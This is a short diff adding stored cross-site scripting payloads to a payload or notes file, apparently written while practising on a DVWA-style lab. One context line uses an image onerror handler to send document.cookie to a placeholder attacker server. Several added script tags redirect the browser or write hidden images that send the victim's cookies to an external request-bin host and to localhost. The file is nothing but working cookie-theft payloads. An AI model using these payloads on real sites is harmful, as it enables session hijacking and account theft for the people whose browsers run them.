@@ -13,3 +13,12 @@ ou
 
 Michel<img src="http://localhost:2000?cookie='+document.cookie" style="display:none;" onerror="document.location='http://<SERVER_ATTAQUANT>/recup_cookie.php?
 cookie='+document.cookie;">
+
+
+<script>document.location = "https://enzbu1ps3tzud.x.pipedream.net/?cookie4="+document.cookie</script>
+
+<script>document.write('<img src="http://localhost:81/vulnerabilities/xss_s/?cookie='+document.cookie+'"  style="display:none"/>');</script>
+
+<script>document.location = "https://enzbu1ps3tzud.x.pipedream.net/?cookie4="+document.cookie</script>
+
+<script>document.write('<img src="https://enzbu1ps3tzud.x.pipedream.net/?cookie5='+document.cookie+'"  style="display:none"/>');</script>
